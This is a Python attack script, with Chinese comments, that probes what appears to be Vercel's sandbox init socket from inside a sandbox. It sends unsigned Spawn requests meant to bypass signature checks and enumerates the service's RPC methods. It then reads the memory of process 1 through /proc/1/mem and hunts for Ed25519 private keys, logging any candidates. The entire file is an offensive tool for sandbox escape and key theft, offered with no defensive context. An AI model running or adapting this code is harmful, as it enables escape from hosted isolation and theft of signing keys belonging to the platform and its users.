# -*- coding: utf-8 -*-
"""v201 payload (sandbox user): SpawnService/Spawn 无签名调用 + 签名绕过
1. Content-Type: application/connect+json 调 Spawn 变体
2. init.sock 方法枚举
3. 内存深扫找 Ed25519 seed / 私钥 (44字符 base64 特征)"""
import socket, time, json, os, sys, re

def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

def punix(sp, path, body, t=8, ctype='application/connect+json', extra=None):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n' % (path, ctype)
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n' % len(b)
        if extra:
            for k, v in extra.items():
                hdrs += '%s: %s\r\n' % (k, v)
        hdrs += '\r\n'
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

SOCK = '/run/vercel/share/init.sock'

# ============ 1: Spawn 变体 (connect+json) ============
log('=== 1 spawn variants ===')
for body in [
    {},
    {'name': 'x'},
    {'command': 'x'},
    {'cmd': 'x'},
    {'executable': 'x'},
    {'args': ['x']},
    {'executablePath': 'x'},
    {'path': 'x'},
    {'processId': 'x'},
    {'id': 'x'},
]:
    st, pay = punix(SOCK, '/vercel.sandbox.spawn.v1.SpawnService/Spawn', body, t=6)
    log('SPAWN %r -> %s %r' % (body, st, pay[:350]))

# ============ 2: 方法枚举 ============
log('=== 2 method enum ===')
for m in ['Ping', 'Kill', 'Spawn', 'Exec', 'Start', 'Stop', 'Wait', 'List', 'Get', 'Status', 'Info', 'Describe', 'Delete', 'Create', 'Run', 'Open', 'Close', 'Send', 'Receive', 'Resize', 'Signal', 'Attach', 'Detach', 'Version', 'Health', 'Configure']:
    st, pay = punix(SOCK, '/vercel.sandbox.spawn.v1.SpawnService/%s' % m, {}, t=4)
    if st not in ('HTTP/1.1 404 Not Found',):
        log('ENUM %s -> %s %r' % (m, st, pay[:200]))

# ============ 3: 内存深扫 ============
log('=== 3 mem deep ===')
try:
    maps = open('/proc/1/maps', 'rb').read().decode(errors='replace')
    regions = []
    for line in maps.splitlines():
        parts = line.split()
        if len(parts) >= 2 and 'r' in parts[1]:
            a, b = parts[0].split('-')
            regions.append((int(a, 16), int(b, 16)))
    log('MEM regions=%d' % len(regions))
    b64pat = re.compile(rb'[A-Za-z0-9+/]{40,44}={0,2}')
    found = 0
    with open('/proc/1/mem', 'rb') as m:
        for a, b in regions:
            sz = b - a
            if sz > 64 * 1024 * 1024 or sz <= 0:
                continue
            try:
                m.seek(a)
                chunk = m.read(min(sz, 24 * 1024 * 1024))
            except Exception:
                continue
            # Ed25519 seed: 44 base64 chars (32 bytes)
            for mm in b64pat.finditer(chunk):
                s64 = mm.group(0)
                if len(s64) >= 43:
                    # 解码看是否 32 字节
                    try:
                        import base64
                        raw = base64.b64decode(s64 + b'=' * (-len(s64) % 4))
                        if len(raw) == 32:
                            ctx = chunk[max(0, mm.start() - 60):mm.end() + 60]
                            log('MEMB64 %x: %s ctx=%r' % (a + mm.start(), s64.decode(), ctx.decode(errors='replace')))
                            found += 1
                            if found > 15:
                                break
                    except Exception:
                        pass
            if found > 15:
                break
    log('MEM scan done found=%d' % found)
except Exception as e:
    log('MEM EXC %s' % e)

log('V201_DONE')
